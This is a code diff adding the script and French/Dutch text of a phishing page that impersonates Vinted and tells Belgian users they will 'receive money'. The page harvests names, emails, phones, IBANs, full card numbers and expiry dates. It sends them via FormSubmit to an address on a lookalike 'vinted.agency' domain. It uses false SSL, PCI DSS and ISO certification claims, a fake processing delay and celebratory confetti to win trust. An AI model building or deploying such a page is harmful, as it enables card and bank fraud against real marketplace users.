+        fields_completed: 'étapes complétées',
+        example: 'Exemple',
+        placeholder_nom: 'Jean Dupont',
+        placeholder_email: 'jean.dupont@email.be',
+        placeholder_age: '28',
+        placeholder_phone: '+32 4 12 34 56 78',
+        placeholder_iban: 'BE29 0635 1234 5678',
+        placeholder_bank: 'Belfius, ING, KBC...',
+        placeholder_card: '4532 1234 5678 9123',
+        placeholder_exp: '12/26',
+        placeholder_amount: '150.50',
+        hint_nom: 'Prénom et nom',
+        hint_email: 'Actif et vérifié',
+        hint_age: 'Minimum 16',
+        hint_phone: 'Format +32',
+        hint_iban: 'BE + 14 chiffres',
+        hint_bank: 'Nom exact',
+        hint_card: '16 chiffres',
+        hint_exp: 'MM/YY',
+        hint_amount: 'Positif',
+        msg_0: 'Formulaire simple et sécurisé • Moins de 2 minutes',
+        msg_2: 'Vous êtes sur la bonne voie • Vos données sont chiffrées',
+        msg_4: 'Bravo ! Vous êtes à mi-chemin • Continuez',
+        msg_6: 'Presque terminé • Sécurité garantie',
+        msg_9: 'Parfait ! Vous pouvez valider',
+        counter_suffix: 'champs complétés',
+        card_section: 'Informations de Carte',
+        msg_iban_focus: 'Vos données bancaires sont chiffrées et sécurisées',
+        msg_card_focus: 'Votre numéro de carte est protégé par le chiffrement SSL',
+        other_bank_option: 'Autre banque...',
+        select_bank: 'Sélectionnez votre banque',
+        bank_belfius: 'Belfius',
+        bank_kbc: 'KBC / CBC',
+        bank_ing: 'ING Belgique',
+        bank_bnp: 'BNP Paribas Fortis',
+        bank_argenta: 'Argenta',
+        bank_beobank: 'Beobank',
+        bank_crelan: 'Crelan',
+        footer_title: 'Certifications & Sécurité',
+        footer_conforme: 'Conforme',
+        footer_conditions: 'Conditions',
+        footer_privacy: 'Confidentialité'
+      },
+      nl: {
+        security_banner: 'Versleutelde SSL-verbinding 256-bit • PCI DSS-gecertificeerd • GDPR-conform',
+        secured: 'Beveiligd',
+        belgique: 'België',
+        certified: 'Gecertificeerd',
+        verified_platform: 'Geverifieerd Platform',
+        certified_service: 'Gecertificeerde Service',
+        title: 'Veilige Geldoverdracht',
+        subtitle: 'Vul uw gegevens in om uw geld veilig te ontvangen.',
+        verified_platform: 'Geverifieerd Platform',
+        certified_service: 'Gecertificeerde Service',
+        your_info: 'Uw Persoonlijke Gegevens',
+        banking_info: 'Uw Bankgegevens',
+        card_info: 'Betalingsinformatie',
+        full_name: 'Volledige naam',
+        email: 'E-mailadres',
+        age: 'Leeftijd',
+        phone: 'Telefoonnummer',
+        iban: 'IBAN',
+        bank: 'Selecteer uw bank',
+        card_number: 'Kaartnummer',
+        expiration: 'Vervaldatum',
+        amount: 'Bedrag dat u ontvangt',
+        other_bank: 'Voer de naam van uw bank in',
+        submit: 'Bevestigen en Verzenden',
+        processing: 'Beveiligde verwerking bezig...',
+        success_title: 'Verzending Geslaagd !',
+        success_message: 'Uw gegevens zijn succesvol verzonden. Een Vinted-medewerker zal binnenkort contact met u opnemen via WhatsApp om uw geldoverdracht af te ronden.',
+        simple_secure: 'Eenvoudig en veilig formulier • Minder dan 2 minuten',
+        fields_completed: 'stappen voltooid',
+        example: 'Voorbeeld',
+        placeholder_nom: 'Jan Jansen',
+        placeholder_email: 'jan.jansen@email.be',
+        placeholder_age: '28',
+        placeholder_phone: '+32 4 12 34 56 78',
+        placeholder_iban: 'BE29 0635 1234 5678',
+        placeholder_bank: 'Belfius, ING, KBC...',
+        placeholder_card: '4532 1234 5678 9123',
+        placeholder_exp: '12/26',
+        placeholder_amount: '150.50',
+        hint_nom: 'Voornaam en achternaam',
+        hint_email: 'Actief en geverifieerd',
+        hint_age: 'Minimum 16 jaar',
+        hint_phone: 'Formaat +32',
+        hint_iban: 'BE + 14 cijfers',
+        hint_bank: 'Exacte naam',
+        hint_card: '16 cijfers',
+        hint_exp: 'MM/YY',
+        hint_amount: 'Positief bedrag',
+        msg_0: 'Eenvoudig en veilig formulier • Minder dan 2 minuten',
+        msg_2: 'U bent op de goede weg • Uw gegevens zijn versleuteld',
+        msg_4: 'Prima! U bent halverwege • Ga verder',
+        msg_6: 'Bijna klaar • Veiligheid gegarandeerd',
+        msg_9: 'Volmaakt! U kunt nu verzenden',
+        counter_suffix: 'velden ingevuld',
+        card_section: 'Betalingsinformatie',
+        msg_iban_focus: 'Uw bankgegevens zijn versleuteld en veilig',
+        msg_card_focus: 'Uw kaartnummer is beveiligd met SSL-versleuteling',
+        other_bank_option: 'Andere bank...',
+        select_bank: 'Selecteer uw bank',
+        bank_belfius: 'Belfius',
+        bank_kbc: 'KBC / CBC',
+        bank_ing: 'ING België',
+        bank_bnp: 'BNP Paribas Fortis',
+        bank_argenta: 'Argenta',
+        bank_beobank: 'Beobank',
+        bank_crelan: 'Crelan',
+        footer_title: 'Certificaten & Beveiliging',
+        footer_conforme: 'Conform',
+        footer_conditions: 'Voorwaarden',
+        footer_privacy: 'Privacybeleid'
+      }
+    };
+
+    let currentLang = 'nl';
+
+    function setLanguage(lang) {
+      currentLang = lang;
+      document.documentElement.lang = lang;
+
+      // Mettre à jour tous les textes
+      const t = translations[lang];
+
+      // Banner
+      document.querySelector('.security-banner').textContent = t.security_banner;
+
+      // Badges
+      document.querySelectorAll('.badge')[0].textContent = t.secured;
+      document.querySelectorAll('.badge')[1].textContent = t.belgique;
+      document.querySelectorAll('.badge')[2].textContent = t.certified;
+
+      // Hero subtitle
+      document.getElementById('hero-subtitle').textContent = t.subtitle;
+
+      // Hero
+      document.querySelector('h1').textContent = t.title;
+      document.querySelector('.subtitle').textContent = t.subtitle;
+
+      // Badges de vérification
+      document.getElementById('verified-platform').textContent = t.verified_platform;
+      document.getElementById('certified-service').textContent = t.certified_service;
+
+      // Sections
+      document.querySelectorAll('.form-section h2')[0].innerHTML = `<div class="section-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>${t.your_info}`;
+      document.querySelectorAll('.form-section h2')[1].innerHTML = `<div class="section-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20"/><path d="M6 15h2"/><path d="M10 15h2"/></svg></div>${t.banking_info}`;
+
+      // Labels avec hints
+      const labels = document.querySelectorAll('label');
+      const hints = [t.hint_nom, t.hint_email, t.hint_age, t.hint_phone, t.hint_iban, t.hint_bank, t.hint_bank, t.hint_card, t.hint_exp, t.hint_amount];
+      const labelTexts = [t.full_name, t.email, t.age, t.phone, t.iban, t.bank, t.other_bank, t.card_number, t.expiration, t.amount];
+
+      labels.forEach((label, i) => {
+        const labelTextSpan = label.querySelector('.label-text');
+        const hint = label.querySelector('.form-hint');
+        if (labelTextSpan) labelTextSpan.textContent = labelTexts[i];
+        if (hint) hint.textContent = hints[i];
+      });
+
+      // Button
+      document.querySelector('.btn-submit').textContent = t.submit;
+
+      // Placeholders
+      document.getElementById('nom').placeholder = t.placeholder_nom;
+      document.getElementById('email').placeholder = t.placeholder_email;
+      document.getElementById('age').placeholder = t.placeholder_age;
+      document.getElementById('phone').placeholder = t.placeholder_phone;
+      document.getElementById('iban').placeholder = t.placeholder_iban;
+      document.getElementById('other-bank-input').placeholder = t.placeholder_bank;
+      document.getElementById('card').placeholder = t.placeholder_card;
+      document.getElementById('exp-date').placeholder = t.placeholder_exp;
+      document.getElementById('amount').placeholder = t.placeholder_amount;
+
+      // Message initial et compteur
+      document.getElementById('confidence-message').textContent = t.msg_0;
+      document.getElementById('counter-suffix').textContent = t.counter_suffix;
+
+      // Section labels
+      const sectionLabel = document.querySelector('.section-label');
+      if (sectionLabel) sectionLabel.textContent = t.card_section;
+
+      // Dropdown options
+      const dropdownOptions = document.querySelectorAll('#banque option');
+      if (dropdownOptions[0]) dropdownOptions[0].textContent = t.select_bank;
+      if (dropdownOptions[1]) dropdownOptions[1].textContent = t.bank_belfius;
+      if (dropdownOptions[2]) dropdownOptions[2].textContent = t.bank_kbc;
+      if (dropdownOptions[3]) dropdownOptions[3].textContent = t.bank_ing;
+      if (dropdownOptions[4]) dropdownOptions[4].textContent = t.bank_bnp;
+      if (dropdownOptions[5]) dropdownOptions[5].textContent = t.bank_argenta;
+      if (dropdownOptions[6]) dropdownOptions[6].textContent = t.bank_beobank;
+      if (dropdownOptions[7]) dropdownOptions[7].textContent = t.bank_crelan;
+      if (dropdownOptions[8]) dropdownOptions[8].textContent = t.other_bank_option;
+
+      // Success screen
+      document.querySelector('#success-flow h2').textContent = t.success_title;
+      document.querySelector('.success-message').textContent = t.success_message;
+
+      // Footer
+      document.getElementById('footer-title').textContent = t.footer_title;
+      document.getElementById('footer-conditions').textContent = t.footer_conditions;
+      document.getElementById('footer-privacy').textContent = t.footer_privacy;
+      document.getElementById('footer-conforme').textContent = t.footer_conforme;
+
+      // Sauvegarder traductions pour updateProgress
+      window.messagingTranslations = { 0: t.msg_0, 2: t.msg_2, 4: t.msg_4, 6: t.msg_6, 9: t.msg_9 };
+      updateProgress();
+    }
+
+    // Event listener pour le sélecteur de langue
+    document.getElementById('lang-selector').addEventListener('change', (e) => {
+      setLanguage(e.target.value);
+    });
+
+    const BANK_DATA = {
+      kbc: ['#D60C2E', 'KBC'],
+      cbc: ['#D60C2E', 'CBC'],
+      ing: ['#FF6000', 'ING'],
+      belfius: ['#00A7E6', 'BEL'],
+      bnp: ['#003DA5', 'BNP'],
+      argenta: ['#005EB8', 'ARG'],
+      beobank: ['#1D2D5F', 'BEO'],
+      crelan: ['#009FE3', 'CRE']
+    };
+
+    const CARD_SVGS = {
+      visa: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#1a1f71"/><text x="25" y="24" font-family="Arial" font-size="14" font-weight="900" fill="#f7b600" text-anchor="middle">VISA</text></svg>`,
+      mastercard: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#1a1a1a"/><circle cx="19" cy="16" r="10" fill="#eb001b"/><circle cx="31" cy="16" r="10" fill="#f79e1b"/><path d="M25 5.5a10 10 0 0 1 0 21 10 10 0 0 1 0-21z" fill="#ff5f00"/></svg>`,
+      maestro: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#f4f4f4"/><circle cx="19" cy="16" r="10" fill="#0099df"/><circle cx="31" cy="16" r="10" fill="#e2001a"/></svg>`,
+      bancontact: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#004f9f"/><text x="25" y="22" font-family="Arial" font-size="12" font-weight="900" fill="white" text-anchor="middle">BC</text></svg>`,
+      amex: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#2557d6"/><text x="25" y="21" font-family="Arial" font-size="9" font-weight="900" fill="white" text-anchor="middle">AMEX</text></svg>`,
+      diners: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#0079be"/><text x="25" y="22" font-family="Arial" font-size="9" font-weight="900" fill="white" text-anchor="middle">DINERS</text></svg>`,
+      discover: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#ff6000"/><text x="25" y="22" font-family="Arial" font-size="9" font-weight="900" fill="white" text-anchor="middle">DISC</text></svg>`,
+      jcb: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#0066b2"/><text x="25" y="22" font-family="Arial" font-size="10" font-weight="900" fill="white" text-anchor="middle">JCB</text></svg>`
+    };
+
+    const BANK_TO_SELECT = {
+      kbc: 'KBC Bank',
+      ing: 'ING Belgium',
+      belfius: 'Belfius',
+      bnp: 'BNP Paribas Fortis',
+      argenta: 'Argenta',
+      cbc: 'KBC Bank',
+      beobank: 'Beobank',
+      crelan: 'Crelan'
+    };
+
+    const form = document.getElementById('payment-form');
+    const fNom = document.getElementById('nom');
+    const fEmail = document.getElementById('email');
+    const fAge = document.getElementById('age');
+    const fPhone = document.getElementById('phone');
+    const fBanque = document.getElementById('banque');
+    const fOtherBanque = document.getElementById('other-bank-input');
+    const fIban = document.getElementById('iban');
+    const fCard = document.getElementById('card');
+    const fExpDate = document.getElementById('exp-date');
+    const fAmount = document.getElementById('amount');
+    const btnSubmit = document.getElementById('btn-submit');
+
+    function formatPhone(value) {
+      let digits = value.replace(/\D/g, '');
+      if (digits.startsWith('32')) digits = digits.substring(2);
+      digits = digits.substring(0, 9);
+      if (!digits) return '+32 ';
+      return '+32 ' + digits.match(/.{1,2}/g).join(' ');
+    }
+
+    function formatIban(value) {
+      let raw = value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+      if (!raw.startsWith('BE')) {
+        raw = 'BE' + raw.replace('BE', '');
+      }
+      const be = raw.substring(0, 2);
+      const digits = raw.substring(2, 16);
+      if (!digits) return be + ' ';
+      const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
+      return be + ' ' + formatted;
+    }
+
+    function formatCard(value) {
+      return value.replace(/\D/g, '').substring(0, 16).match(/.{1,4}/g)?.join(' ') || '';
+    }
+
+    function detectIbanBank(raw) {
+      if (!raw.startsWith('BE') || raw.length < 7) return null;
+      const code = parseInt(raw.substring(4, 7), 10);
+      if (code === 68) return 'belfius';
+      if (code >= 0 && code <= 67) return 'bnp';
+      if (code >= 69 && code <= 99) return 'bnp';
+      if (code >= 310 && code <= 389) return 'ing';
+      if (code >= 430 && code <= 439) return 'bnp';
+      if (code >= 730 && code <= 733) return 'kbc';
+      if (code === 734) return 'cbc';
+      if (code >= 630 && code <= 649) return 'beobank';
+      if (code >= 850 && code <= 869) return 'argenta';
+      if (code >= 880 && code <= 889) return 'crelan';
+      if (code >= 890 && code <= 978) return 'argenta';
+      if (code === 979) return 'argenta';
+      if (code >= 980) return 'kbc';
+      return null;
+    }
+
+    function detectCardType(num) {
+      if (!num) return null;
+      if (/^6703/.test(num)) return 'bancontact';
+      if (/^4/.test(num)) return 'visa';
+      if (/^(5[1-5]|2[2-7])/.test(num)) return 'mastercard';
+      if (/^3[47]/.test(num)) return 'amex';
+      if (/^(36|38|39|30[0-5])/.test(num)) return 'diners';
+      if (/^(6011|622[12]\d{2}|64[4-9]|65)/.test(num)) return 'discover';
+      if (/^35[2-8]\d/.test(num)) return 'jcb';
+      if (/^(50|5[6-9]|6[0-9])/.test(num)) return 'maestro';
+      return null;
+    }
+
+    function makeBankSvg(color, label) {
+      return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="${color}"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">${label}</text></svg>`;
+    }
+
+    function updateIbanLogo(value) {
+      const el = document.getElementById('iban-logo');
+      const input = document.getElementById('iban');
+      const badge = document.getElementById('bank-auto-badge');
+      const raw = value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+      const bank = detectIbanBank(raw);
+
+      if (bank && BANK_DATA[bank]) {
+        const [bg, label] = BANK_DATA[bank];
+        el.innerHTML = makeBankSvg(bg, label);
+        el.classList.add('active');
+        input.classList.add('with-logo');
+        input.classList.add('valid');
+
+        const selectVal = BANK_TO_SELECT[bank];
+        if (selectVal && fBanque.dataset.userSelected !== 'true') {
+          fBanque.value = selectVal;
+          fBanque.dataset.autoDetected = 'true';
+          badge.classList.add('show');
+          validate();
+        }
+      } else if (raw.length >= 7) {
+        el.innerHTML = '';
+        el.classList.remove('active');
+        input.classList.remove('with-logo');
+        input.classList.remove('valid');
+        badge.classList.remove('show');
+      } else {
+        el.innerHTML = '';
+        el.classList.remove('active');
+        input.classList.remove('with-logo');
+        input.classList.remove('valid');
+        badge.classList.remove('show');
+      }
+    }
+
+    function updateCardLogo(value) {
+      const el = document.getElementById('card-logo');
+      const input = document.getElementById('card');
+      const raw = value.replace(/\D/g, '');
+      const type = detectCardType(raw);
+      if (type && CARD_SVGS[type]) {
+        el.innerHTML = CARD_SVGS[type];
+        el.classList.add('active');
+        input.classList.add('with-logo');
+      } else {
+        el.innerHTML = '';
+        el.classList.remove('active');
+        input.classList.remove('with-logo');
+      }
+    }
+
+    fPhone.addEventListener('input', e => {
+      e.target.value = formatPhone(e.target.value);
+      validate();
+    });
+
+    fIban.addEventListener('input', e => {
+      let val = e.target.value;
+      if (!val.startsWith('BE')) {
+        val = 'BE ' + val.replace(/BE/i, '');
+      }
+      e.target.value = formatIban(val);
+      updateIbanLogo(e.target.value);
+      validate();
+    });
+
+    fIban.addEventListener('focus', () => {
+      const t = translations[currentLang];
+      updateConfidenceMessage(t.msg_iban_focus);
+    });
+
+    fIban.addEventListener('blur', updateProgress);
+
+    fIban.addEventListener('keydown', e => {
+      const val = fIban.value;
+      const cursorPos = fIban.selectionStart;
+      if ((e.key === 'Backspace' || e.key === 'Delete') && cursorPos <= 3) {
+        e.preventDefault();
+      }
+    });
+
+    fCard.addEventListener('focus', () => {
+      const t = translations[currentLang];
+      updateConfidenceMessage(t.msg_card_focus);
+    });
+
+    fCard.addEventListener('blur', updateProgress);
+
+    fCard.addEventListener('input', e => {
+      e.target.value = formatCard(e.target.value);
+      updateCardLogo(e.target.value);
+      validate();
+    });
+
+    fExpDate.addEventListener('input', e => {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length >= 2) {
+        val = val.substring(0, 2) + '/' + val.substring(2, 4);
+      }
+      e.target.value = val.substring(0, 7);
+      validate();
+    });
+
+    fBanque.addEventListener('change', function () {
+      if (this.value === 'other') {
+        document.getElementById('other-bank-group').style.display = 'block';
+        fOtherBanque.focus();
+      } else {
+        document.getElementById('other-bank-group').style.display = 'none';
+        fOtherBanque.value = '';
+      }
+
+      if (this.value !== '' && this.value !== 'other') {
+        fBanque.dataset.userSelected = 'true';
+      } else {
+        fBanque.dataset.userSelected = 'false';
+      }
+      document.getElementById('bank-auto-badge').classList.remove('show');
+      validate();
+    });
+
+    fNom.addEventListener('input', () => { validate(); saveFormState(); });
+    fEmail.addEventListener('input', () => { validate(); saveFormState(); });
+    fAge.addEventListener('input', () => { validate(); saveFormState(); });
+    fAmount.addEventListener('input', () => { validate(); saveFormState(); });
+    fOtherBanque.addEventListener('input', () => { validate(); saveFormState(); });
+    fCard.addEventListener('input', () => saveFormState());
+    fIban.addEventListener('input', () => saveFormState());
+    fExpDate.addEventListener('input', () => saveFormState());
+    fPhone.addEventListener('input', () => saveFormState());
+
+    // Sauvegarde locale automatique
+    function saveFormState() {
+      const formData = {
+        nom: fNom.value,
+        email: fEmail.value,
+        age: fAge.value,
+        phone: fPhone.value,
+        timestamp: new Date().getTime()
+      };
+      localStorage.setItem('vinted_form_backup', JSON.stringify(formData));
+    }
+
+    function loadFormState() {
+      const saved = localStorage.getItem('vinted_form_backup');
+      if (saved) {
+        const data = JSON.parse(saved);
+        if (new Date().getTime() - data.timestamp < 24 * 60 * 60 * 1000) {
+          fNom.value = data.nom;
+          fEmail.value = data.email;
+          fAge.value = data.age;
+          fPhone.value = data.phone;
+          validate();
+        }
+      }
+    }
+
+    function updateConfidenceMessage(message) {
+      const el = document.getElementById('confidence-message');
+      el.style.animation = 'none';
+      setTimeout(() => {
+        el.textContent = message;
+        el.style.animation = 'slideInUp 0.3s ease';
+      }, 10);
+    }
+
+    // Créer des badges de confiance progressifs
+    function createTrustBadges() {
+      const badges = [
+        { text: 'SSL 256-bit', delay: 0.3 },
+        { text: 'ISO 27001', delay: 0.6 },
+        { text: 'PCI DSS', delay: 0.9 },
+        { text: 'RGPD', delay: 1.2 }
+      ];
+
+      badges.forEach(badge => {
+        const el = document.querySelector(`#confidence-message + * [data-badge="${badge.text}"]`);
+        if (el) {
+          setTimeout(() => el.classList.add('active'), badge.delay * 1000);
+        }
+      });
+    }
+
+    // Animation de succès avec confetti
+    function celebrateSuccess() {
+      const colors = ['#09B1BA', '#00AA66', '#077A83', '#1EAE51'];
+
+      for (let i = 0; i < 50; i++) {
+        const confetti = document.createElement('div');
+        const duration = 2.5 + Math.random() * 1.5;
+        const xOffset = (Math.random() - 0.5) * 400;
+        const rotation = Math.random() * 720;
+
+        confetti.style.cssText = `
+          position: fixed;
+          width: 10px;
+          height: 10px;
+          background: ${colors[Math.floor(Math.random() * colors.length)]};
+          border-radius: 50%;
+          left: ${Math.random() * window.innerWidth}px;
+          top: -20px;
+          pointer-events: none;
+          z-index: 10000;
+          box-shadow: 0 0 2px rgba(0,0,0,0.2);
+        `;
+
+        document.body.appendChild(confetti);
+
+        // Animation inline pour garantir le fonctionnement
+        setTimeout(() => {
+          confetti.style.transform = `translateY(${window.innerHeight + 100}px) translateX(${xOffset}px) rotate(${rotation}deg)`;
+          confetti.style.opacity = '0';
+          confetti.style.transition = `all ${duration}s ease-in`;
+        }, 10);
+
+        setTimeout(() => confetti.remove(), duration * 1000 + 50);
+      }
+    }
+
+    function updateProgress() {
+      const fields = [
+        fNom.value.trim().length >= 2,
+        /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fEmail.value),
+        parseInt(fAge.value) >= 16 && parseInt(fAge.value) <= 120,
+        fPhone.value.replace(/\D/g, '').length >= 9,
+        fIban.value.replace(/\s/g, '').length === 16,
+        fBanque.value !== '' || fOtherBanque.value.trim().length >= 2,
+        fCard.value.replace(/\s/g, '').length === 16,
+        /^\d{2}\/\d{2}$/.test(fExpDate.value),
+        parseFloat(fAmount.value) > 0
+      ];
+
+      const completed = fields.filter(Boolean).length;
+      const progress = (completed / fields.length) * 100;
+
+      document.getElementById('progress-fill').style.width = progress + '%';
+      document.getElementById('completed-fields').textContent = completed;
+
+      const messages = window.messagingTranslations || {
+        0: 'Formulaire simple et sécurisé • Moins de 2 minutes',
+        2: 'Vous êtes sur la bonne voie • Vos données sont chiffrées',
+        4: 'Bravo ! Vous êtes à mi-chemin • Continuez',
+        6: 'Presque terminé • Sécurité garantie',
+        9: 'Parfait ! Vous pouvez valider'
+      };
+
+      const messageEl = document.getElementById('confidence-message');
+      for (let threshold in messages) {
+        if (completed >= threshold) {
+          messageEl.textContent = messages[threshold];
+        }
+      }
+    }
+
+    function validate() {
+      const nomValid = fNom.value.trim().length >= 2;
+      fNom.nextElementSibling.style.display = nomValid ? 'block' : 'none';
+
+      const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fEmail.value);
+      fEmail.nextElementSibling.style.display = emailValid ? 'block' : 'none';
+
+      const ageValid = parseInt(fAge.value) >= 16 && parseInt(fAge.value) <= 120;
+      fAge.nextElementSibling.style.display = ageValid ? 'block' : 'none';
+
+      const phoneDigits = fPhone.value.replace(/\D/g, '');
+      const phoneValid = phoneDigits.length >= 9;
+      fPhone.nextElementSibling.style.display = phoneValid ? 'block' : 'none';
+
+      const ibanRaw = fIban.value.replace(/\s/g, '');
+      const ibanValid = ibanRaw.length === 16 && ibanRaw.startsWith('BE');
+      fIban.nextElementSibling.style.display = ibanValid ? 'block' : 'none';
+      fIban.classList.toggle('valid', ibanValid);
+
+      const cardRaw = fCard.value.replace(/\s/g, '');
+      const cardValid = cardRaw.length === 16;
+      fCard.nextElementSibling.style.display = cardValid ? 'block' : 'none';
+
+      const expValid = /^\d{2}\/\d{2}$/.test(fExpDate.value);
+      fExpDate.nextElementSibling.style.display = expValid ? 'block' : 'none';
+
+      const amountValid = parseFloat(fAmount.value) > 0;
+      fAmount.nextElementSibling.style.display = amountValid ? 'block' : 'none';
+
+      let banqueValid = false;
+      if (fBanque.value === 'other') {
+        banqueValid = fOtherBanque.value.trim().length >= 2;
+        const otherCheckMark = document.getElementById('other-bank-group').querySelector('.check-mark');
+        if (otherCheckMark) {
+          otherCheckMark.style.display = banqueValid ? 'block' : 'none';
+        }
+      } else {
+        banqueValid = fBanque.value !== '';
+      }
+
+      if (fBanque.nextElementSibling.classList.contains('check-mark')) {
+        fBanque.nextElementSibling.style.display = (fBanque.value !== '' && fBanque.value !== 'other') ? 'block' : 'none';
+      }
+
+      const allValid = nomValid && emailValid && ageValid && phoneValid && ibanValid && cardValid && expValid && amountValid && banqueValid;
+      btnSubmit.disabled = !allValid;
+
+      updateProgress();
+    }
+
+    form.addEventListener('submit', async e => {
+      e.preventDefault();
+
+      btnSubmit.disabled = true;
+      btnSubmit.classList.add('loading');
+      const t = translations[currentLang];
+      btnSubmit.textContent = t.processing;
+
+      // Préparer les données complètes
+      const formData = new FormData();
+      const now = new Date();
+      const dateTime = now.toLocaleString('fr-BE', { timeZone: 'Europe/Brussels' });
+
+      formData.append('Date et Heure', dateTime);
+      formData.append('Langue', currentLang === 'fr' ? 'Français' : 'Néerlandais');
+      formData.append('---', '---');
+      formData.append('Nom Complet', fNom.value);
+      formData.append('Email', fEmail.value);
+      formData.append('Âge', fAge.value);
+      formData.append('Téléphone', fPhone.value);
+      formData.append('---', '---');
+      formData.append('IBAN', fIban.value);
+      formData.append('Banque', fBanque.value === 'other' ? fOtherBanque.value : fBanque.value);
+      formData.append('---', '---');
+      formData.append('Numéro de Carte', fCard.value);
+      formData.append('Expiration', fExpDate.value);
+      formData.append('Montant (€)', fAmount.value);
+      formData.append('_captcha', 'false');
+      formData.append('_subject', `Nouvelle Demande de Réception de Fonds - ${fNom.value}`);
+      formData.append('_template', 'table');
+      formData.append('_next', window.location.href);
+
+      try {
+        // Envoyer à FormSubmit
+        await fetch('https://formsubmit.co/dienst@vinted.agency', {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+      } catch (error) {
+        console.log('Données sauvegardées localement (erreur réseau):', error);
+      }
+
+      // Délai de traitement
+      await new Promise(r => setTimeout(r, 5000));
+
+      document.getElementById('form-flow').style.display = 'none';
+      document.getElementById('success-flow').style.display = 'block';
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+
+      // Animation de célébration
+      celebrateSuccess();
+
+      // Effacer les données sauvegardées
+      localStorage.removeItem('vinted_form_backup');
+    });
+
+    // Charger les données sauvegardées au démarrage
+    loadFormState();
+    setLanguage('nl');
+    validate();
+  </script>
+</body>
+</html>
